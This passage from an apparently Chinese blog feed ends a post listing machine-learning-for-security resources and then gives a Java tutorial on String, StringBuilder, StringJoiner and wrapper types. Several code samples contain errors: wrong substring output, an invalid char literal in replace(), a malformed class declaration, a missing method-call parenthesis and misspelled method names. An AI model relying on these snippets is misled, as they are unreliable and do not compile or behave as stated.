<p><a href="http://fsecurify.com/using-neural-networks-to-generate-human-readable-passwords/"><strong>2. Using Neural Networks to generate human readable passwords</strong></a></p>
<p>链接中是一位大神自己编写的一个基于Keras框架和python语言的密码生成器，利用了深度神经网络原理，在保证密码安全性的同时也保证了易读性。该项目的代码已经在Github上开源，可以结合上文提到的论文<a href="https://www.usenix.org/conference/usenixsecurity16/technical-sessions/presentation/melicher">《Fast, Lean, and Accurate: Modeling Password Guessability Using Neural Networks》</a>一起学习。</p>
<p>原代码：<a href="https://github.com/fchollet/keras/blob/master/examples/lstm_text_generation.py">链接</a></p>
<p><a href="http://fsecurify.com/machine-learning-based-password-strength-checking/"><strong>3. Machine Learning based Password Strength Classification</strong></a></p>
<p>该项目关于用机器学习算法判断一个已知密码的健壮性，代码已经在Github上开源。</p>
<p>源代码：<a href="https://github.com/faizann24/Machine-Learning-based-Password-Strength-Classification/tree/master">链接</a></p>
<p><a href="http://fsecurify.com/using-machine-learning-detect-malicious-urls/"><strong>4. Using Machine Learning to Detect Malicious URLs</strong></a></p>
<p>该项目关于如何利用机器学习探测恶意的互联网链接地址，据称可以达到98%的正确率。</p>
<p>源代码：<a href="https://github.com/faizann24/Using-machine-learning-to-detect-malicious-URLs">链接</a></p>
<p><a href="http://www.kdnuggets.com/2015/12/big-data-science-security-fraud-detection.html"><strong>5. Big Data and Data Science for Security and Fraud Detection</strong></a></p>
<p>这是一篇综述文章，文中介绍了多个国家/地区/大公司正在使用或研发的大数据分析工具和技术，这些技术结合了文本挖掘、机器学习或者网络分析，能够在早期阶段对网络安全威胁进行检测和预防。</p>
<p><a href="https://deepmlblog.wordpress.com/2016/01/03/how-to-break-a-captcha-system/"><strong>6. Using deep learning to break a Captcha system</strong></a></p>
<p>这是一篇博客文章，介绍了如何利用深度学习技术破解烦人的验证码系统，作者在文中给出了部分关键功能模块的源代码，并且在文末还给出了许多参考链接。</p>
<p><a href="http://web.stanford.edu/class/cs259d/"><strong>7. Data Mining for Cyber Security</strong></a></p>
<p>这是斯坦福大学开设的一个系列公开课，关于数据挖掘在互联网安全中的应用。在链接中可以直接看到课程安排，下载到讲师演讲的文本记录、PPT，查看课后作业的题目和此前同学上传的答案，以及课后的深入阅读列表。这一课程可能是数据科学目前在网络安全领域已经公开的最好的课程之一。</p>
<h2 id="其他">其他</h2>
<p><a href="https://news.mit.edu/2016/ai-system-predicts-85-percent-cyber-attacks-using-input-human-experts-0418"><strong>1. System predicts 85 percent of cyber-attacks using input from human experts</strong></a></p>
<p>这是一篇研究成果介绍的文章，介绍了来自MIT计算机科学与人工智能实验室（CSAIL）和一家机器学习初创公司PatternEx的最新研究成果：一个名为AI2的人工智能平台，能够根据人类网络安全专家输入的数据，对当前网络可能遭到的安全威胁做出预测，正确率高达85%，超越了目前已知的其他同类预测系统。文中通过文字和视频的方式讲解了这一预测系统的基本工作原理。</p>
<p><a href="http://www.mlsecproject.org/#open-source-projects"><strong>2. MLSec</strong></a></p>
<p>这是一个开源项目相关的网站，该网站聚合了一系列将机器学习技术应用于网络安全领域的开源项目，同时还开设了博客文章和社区讨论频道，帮助开发者对这些项目深入理解。</p>
<p><a href="http://blog.sqrrl.com/an-introduction-to-machine-learning-for-cybersecurity-and-threat-hunting"><strong>3. An Introduction to Machine Learning for Cybersecurity and Threat Hunting</strong></a></p>
<p>这是一篇深度文章，通过与几位数据科学大牛访谈的形式，详细介绍了机器学习和网络安全的关系以及相关应用。</p>
<p>以上只是这位外国大牛的总结，如果你手里也有一些值得安利的干货和资源，不妨在文末留言分享出来吧！</p>
<p><em>附原文作者简介：Faizan Ahmad，Fulbright 计划大学生，目前在巴基斯坦国立计算机与新兴科学大学（National University of Computer and Emerging ScienCES）学习，同时在巴基斯坦的拉合尔管理科学大学（Lahore University of Management Sciences）担任研究助理，主攻计算机和网络安全研究方向。</em></p>
<p>来源：<a href="http://www.kdnuggets.com/2017/01/machine-learning-cyber-security.html">kdnuggets</a></p>
]]></content>
      <categories>
        <category>机器学习</category>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java基础学习之核心类</title>
    <url>/Java/code/2.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%A0%B8%E5%BF%83%E7%B1%BB/</url>
    <content><![CDATA[<h1 id="Java基础学习之核心类">Java基础学习之核心类</h1>
<h3 id="字符串">字符串</h3>
<p><code>String</code>是一个引用类型，也是一个类，它的一个重要特点就是<strong>不可变</strong>，这种不可变性是通过内部的<code>private final char[]</code>字段，以及没有任何修改<code>char[]</code>的方法实现的。</p>
<h4 id="字符串比较">字符串比较</h4>
<p>当我们想要比较两个字符串是否相同时，要特别注意，我们实际上是想比较字符串的内容是否相同。必须使用<code>equals()</code>方法而不能用<code>==</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> class <span class="title">Main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String s1 = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        String s2 = <span class="string">&quot;HELLO&quot;</span>.toLowerCase();</span><br><span class="line">        System.out.println(s1 == s2);</span><br><span class="line">        System.out.println(s1.equals(s2));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要忽略大小写比较，使用<code>equalsIgnoreCase()</code>方法。</p>
<p>搜索子串的例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;Hello&quot;</span>.indexof(<span class="string">&quot;l&quot;</span>); <span class="comment">// 2</span></span><br><span class="line"><span class="string">&quot;Hello&quot;</span>.lastIndexof(<span class="string">&quot;l&quot;</span>); <span class="comment">//3</span></span><br><span class="line"><span class="string">&quot;Hello&quot;</span>.startsWith(<span class="string">&quot;He&quot;</span>); <span class="comment">// true</span></span><br><span class="line"><span class="string">&quot;Hello&quot;</span>.endsWith(<span class="string">&quot;lo&quot;</span>); <span class="comment">//true</span></span><br></pre></td></tr></table></figure>
<p>提取子串的例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;Hello&quot;</span>.substring(<span class="number">2</span>); <span class="comment">//&quot;llo&quot;</span></span><br><span class="line"><span class="string">&quot;Hello&quot;</span>.substring(<span class="number">2</span>, <span class="number">4</span>); <span class="comment">//&quot;llo&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="去除首尾空白字符">去除首尾空白字符</h4>
<p>使用<code>trim()</code>方法可以移除字符串首尾空白字符。空白字符包括空格，<code>\t</code>，<code>\r</code>，<code>\n</code>。</p>
<blockquote>
<p>注意：<code>trim()</code>并没有改变字符串的内容，而是返回了一个新字符串。</p>
</blockquote>
<p>另一个<code>strip()</code>方法也可以移除字符串首尾空白字符，包括中文的空格字符<code>\u3000</code>。</p>
<p><code>String</code>还提供了<code>isEmpty()</code>和<code>isBlank()</code>来判断字符串是否为空和空白字符串。</p>
<h4 id="替换子串">替换子串</h4>
<p>使用<code>replace()</code>方法可以根据字符或字符串替换：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String s = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">s.replace(<span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;w&#x27;</span>); <span class="comment">// &quot;hewwo&quot;</span></span><br><span class="line">s.replace(<span class="string">&#x27;ll&#x27;</span>, <span class="string">&quot;~~&quot;</span>); <span class="comment">// &quot;he~~o&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="分割字符串">分割字符串</h4>
<p><code>split()</code>方法根据匹配给定的正则表达式来拆分字符串。<strong>注意：</strong><code> .</code> 、 <code>|</code>和 <code>*</code> 等转义字符，必须得加<code> \\</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String s = <span class="string">&quot;A,B,C,D&quot;</span>;</span><br><span class="line">String[] ss = s.split(<span class="string">&quot;\\,&quot;</span>); <span class="comment">// &#123;&quot;A&quot;, &quot;B&quot;, &quot;C&quot;, &quot;D&quot;&#125;</span></span><br></pre></td></tr></table></figure>
<h4 id="拼接字符串">拼接字符串</h4>
<p>拼接字符串使用静态方法<code>join()</code>，它用指定的字符串连接字符串数组：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] arr = &#123;<span class="string">&quot;A&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;C&quot;</span>&#125;;</span><br><span class="line">String s = String.join(<span class="string">&quot;***&quot;</span>, arr); <span class="comment">// &quot;A***B***C&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="类型转换">类型转换</h4>
<p>静态方法<code>valueOf()</code>可以吧任意基本类型或引用类型转换为字符串。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String.valueOf(<span class="number">123</span>); <span class="comment">//&quot;123&quot;</span></span><br><span class="line">String.valueOf(<span class="number">45.67</span>); <span class="comment">//&quot;45.67&quot;</span></span><br><span class="line">String.valueOf(<span class="keyword">true</span>); <span class="comment">//&quot;true&quot;</span></span><br><span class="line">String.valueOf(<span class="keyword">new</span> Object()); <span class="comment">//java.lang.Object@40f08448</span></span><br></pre></td></tr></table></figure>
<p>字符串转换为<code>int</code>类型：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> n1 = Integer.parseInt(<span class="string">&quot;123&quot;</span>); <span class="comment">//123</span></span><br><span class="line"><span class="keyword">int</span> n2 = Integer.parseInt(<span class="string">&quot;ff&quot;</span>, <span class="number">16</span>); <span class="comment">//按十六进制转换，255</span></span><br></pre></td></tr></table></figure>
<p>字符串转换为<code>boolean</code>类型：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">boolean</span> b1 = Boolean.parseBoolean(<span class="string">&quot;true&quot;</span>);</span><br><span class="line"><span class="keyword">boolean</span> b2 = Boolean.parseBoolean(<span class="string">&quot;FALSE&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="转换为char">转换为char[]</h4>
<p><code>String</code>和<code>char</code>可以互相转换：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span>[] cs = <span class="string">&quot;Hello&quot;</span>.toCharArray();</span><br><span class="line">String s = <span class="keyword">new</span> String(cs);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>如果修改了<code>char[]</code>数组，<code>String</code>并不会改变：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] cs = <span class="string">&quot;Hello&quot;</span>.toCharArray();</span><br><span class="line">        String s = <span class="keyword">new</span> String(cs);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        cs[<span class="number">0</span>] = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="comment">// Hello</span></span><br><span class="line"><span class="comment">// Hello</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这是因为通过<code>new String(char[])</code>创建新的<code>String</code>实例时，它并不会直接引用传入的<code>char[]</code>数组，而是会复制一份，所以，修改外部的<code>char[]</code>数组不会影响<code>String</code>实例内部的<code>char[]</code>数组，因为这是两个不同的数组。</p>
<p>所以，如果传入的对象有可能改变，我们需要复制而不是直接引用，例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] scores = <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;<span class="number">88</span>, <span class="number">99</span>, <span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>&#125;;</span><br><span class="line">        Score s = <span class="keyword">new</span> Score(scores);</span><br><span class="line">        s.printScores();</span><br><span class="line">        scores[<span class="number">2</span>] = <span class="number">55</span>;</span><br><span class="line">        s.printScores;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Score</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] scores;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Score</span><span class="params">(<span class="keyword">int</span>[] scores)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.scores = scores;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printScores</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(Arrays.toString(scores));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="comment">// 88, 99, 11, 22, 33</span></span><br><span class="line"><span class="comment">// 88, 99, 55, 22, 33</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>观察两次输出，由于<code>Score</code>内部直接引用了外部传入的<code>int[]</code>数组，这会造成外部代码对<code>int[]</code>数组的修改，影响到<code>Score</code>类的字段。正确的构造函数如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Score</span><span class="params">(<span class="keyword">int</span>[] scores)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.scores = scores.clone();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="StringBuilder">StringBuilder</h3>
<p><code>StringBuilder</code>是一个可变对象，能高效拼接字符串，往<code>StringBuilder</code>中新增字符时，不会创建新的临时对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">StringBuilder sb = <span class="keyword">new</span> StringBuilder(<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">    sb.append(<span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">    sb.append(i);</span><br><span class="line">&#125;</span><br><span class="line">String s = sb.toString();</span><br><span class="line">System.out.println(s);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="comment">// 0,1,2,3...999</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>此外，<code>StringBuilder</code>还可以进行链式操作：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> sb = <span class="keyword">new</span> StringBuilder(<span class="number">1024</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;Mr&quot;</span>)</span><br><span class="line">            .append(<span class="string">&quot;Bob&quot;</span>)</span><br><span class="line">            .append(<span class="string">&quot;!&quot;</span>)</span><br><span class="line">            .insert(<span class="number">0</span>, <span class="string">&quot;Hello, &quot;</span>);</span><br><span class="line">        System.out.println(sb.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="comment">// Hello, Mr Bob!</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>支持链式操作的关键可以从<code>StringBuilder</code>源码看出：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> StringBuilder <span class="title">append</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.append(str);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">public</span> AbstractStringBuilder <span class="title">append</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (str == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> appendNull();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> len = str.length();</span><br><span class="line">        ensureCapacityInternal(count + len);</span><br><span class="line">        putStringAt(count, str);</span><br><span class="line">        count += len;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>定义的<code>append()</code>方法会返回<code>this</code>，这样，就可以不断调用自身的其他方法。</p>
<p>模仿<code>StringBuilder</code>设计一个可以不断增加的计数器：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Adder adder = <span class="keyword">new</span> Adder();</span><br><span class="line">        adder.add(<span class="number">2</span>)</span><br><span class="line">            .add(<span class="number">5</span>)</span><br><span class="line">            .inc()</span><br><span class="line">            .add(<span class="number">10</span>);</span><br><span class="line">        System.out.println(adder.value())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Adder</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Adder <span class="title">add</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        sum += n;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Adder <span class="title">inc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        sum ++;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">value</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="comment">// 18</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="练习">练习</h4>
<p>请使用<code>StringBuilder</code>构造一个<code>INSERT</code>SQL语句：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itranswarp.learnjava;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Learn Java from https://www.liaoxuefeng.com/</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> liaoxuefeng</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		String[] fields = &#123; <span class="string">&quot;name&quot;</span>, <span class="string">&quot;position&quot;</span>, <span class="string">&quot;salary&quot;</span> &#125;;</span><br><span class="line">		String table = <span class="string">&quot;employee&quot;</span>;</span><br><span class="line">		String insert = buildInsertSql(table, fields);</span><br><span class="line">		System.out.println(insert);</span><br><span class="line">		System.out.println(</span><br><span class="line">				<span class="string">&quot;INSERT INTO employee (name, position, salary) VALUES (?, ?, ?)&quot;</span>.equals(insert) ? <span class="string">&quot;测试成功&quot;</span> : <span class="string">&quot;测试失败&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">static</span> String <span class="title">buildInsertSql</span><span class="params">(String table, String[] fields)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line">		StringBuilder sb = <span class="keyword">new</span> StringBuilder(<span class="string">&quot;INSERT INTO &quot;</span>).append(table).append(<span class="string">&quot; (&quot;</span>);</span><br><span class="line">		<span class="keyword">for</span> (String st: fields) &#123;</span><br><span class="line">			sb.append(st).append(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">         <span class="comment">// 注意去掉最后的&quot;, &quot;:</span></span><br><span class="line">		sb.delete(sb.length()-<span class="number">2</span>, sb.length()).append(<span class="string">&quot;) VALUES (&quot;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (String st : fields) &#123;</span><br><span class="line">			sb.append(<span class="string">&quot;?, &quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		sb.delete(sb.length()-<span class="number">2</span>, sb.length()).append(<span class="string">&quot;)&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> sb.toString();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="StringJoiner">StringJoiner</h3>
<p>在上面的那个练习当中，我们需要<code>, </code>来分割每个字段，可以直接使用<code>StringJoiner</code>对象来干这事。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.StringJoiner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String[] names = &#123;<span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;Grace&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">var</span> sj = <span class="keyword">new</span> StringJoiner(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String name: names) &#123;</span><br><span class="line">            sj.add(name);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sj.toString())</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="comment">// Bob, Alice, Grace</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>还可以指定“开头”和“结尾”：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.StringJoiner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String[] names = &#123;<span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;Grace&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">var</span> sj = <span class="keyword">new</span> StringJoiner(<span class="string">&quot;, &quot;</span>, <span class="string">&quot;Hello&quot;</span>, <span class="string">&quot;!&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String name: names) &#123;</span><br><span class="line">            sj.add(name);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sj.toString())</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="comment">// Hello Bob, Alice, Grace!</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>其实，<code>String</code>还提供了一个静态方法<code>join()</code>，这个方法在内部使用了<code>StringJoiner</code>来拼接字符串，在不需要指定“开头”和“结尾”的时候，用<code>String.join()</code>更方便：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] names = &#123;<span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;Grace&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> s = String.join(<span class="string">&quot;,&quot;</span>, names);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="练习-v2">练习</h4>
<p>请使用<code>StringJoiner</code>构造一个<code>SELECT</code>语句：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itranswarp.learnjava;</span><br><span class="line"><span class="keyword">import</span> java.util.StringJoiner;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Learn Java from https://www.liaoxuefeng.com/</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> liaoxuefeng</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		String[] fields = &#123; <span class="string">&quot;name&quot;</span>, <span class="string">&quot;position&quot;</span>, <span class="string">&quot;salary&quot;</span> &#125;;</span><br><span class="line">		String table = <span class="string">&quot;employee&quot;</span>;</span><br><span class="line">		String select = buildSelectSql(table, fields);</span><br><span class="line">		System.out.println(select);</span><br><span class="line">		System.out.println(<span class="string">&quot;SELECT name, position, salary FROM employee&quot;</span>.equals(select) ? <span class="string">&quot;测试成功&quot;</span> : <span class="string">&quot;测试失败&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">static</span> String <span class="title">buildSelectSql</span><span class="params">(String table, String[] fields)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line">		<span class="keyword">var</span> sj = <span class="keyword">new</span> StringJoiner(<span class="string">&quot;, &quot;</span>, <span class="string">&quot;SELECT &quot;</span>, <span class="string">&quot; FROM &quot;</span>+table);</span><br><span class="line">		<span class="keyword">for</span> (String field: fields) &#123;</span><br><span class="line">			sj.add(field);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sj.toString();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="包装类型">包装类型</h3>
<p>Java为每种基本类型都提供了对应的包装类型：</p>
<table>
<thead>
<tr>
<th style="text-align:left">基本类型</th>
<th style="text-align:left">对应的引用类型</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">boolean</td>
<td style="text-align:left">java.lang.Boolean</td>
</tr>
<tr>
<td style="text-align:left">byte</td>
<td style="text-align:left">java.lang.Byte</td>
</tr>
<tr>
<td style="text-align:left">short</td>
<td style="text-align:left">java.lang.Short</td>
</tr>
<tr>
<td style="text-align:left">int</td>
<td style="text-align:left">java.lang.Integer</td>
</tr>
<tr>
<td style="text-align:left">long</td>
<td style="text-align:left">java.lang.Long</td>
</tr>
<tr>
<td style="text-align:left">float</td>
<td style="text-align:left">java.lang.Float</td>
</tr>
<tr>
<td style="text-align:left">double</td>
<td style="text-align:left">java.lang.Double</td>
</tr>
<tr>
<td style="text-align:left">char</td>
<td style="text-align:left">java.lang.Character</td>
</tr>
</tbody>
</table>
<p>使用静态方法<code>valueOf()</code>创建<code>Integer</code>实例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">100</span>;</span><br><span class="line">        Integer n1 = Integer.valueOf(i);</span><br><span class="line">        Integer n2 = Integer.valueOf(<span class="string">&quot;100&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="自动装箱和自动拆箱">自动装箱和自动拆箱</h4>
<p><code>Int</code>和<code>Integer</code>可以相互转换：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">100</span>;</span><br><span class="line">Integer n = Integer.valueOf(i);</span><br><span class="line"><span class="keyword">int</span> x = n.intValue();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>而Java编译器可以帮助我们自动在<code>int</code>和<code>Integer</code>直降相互转换：</p>
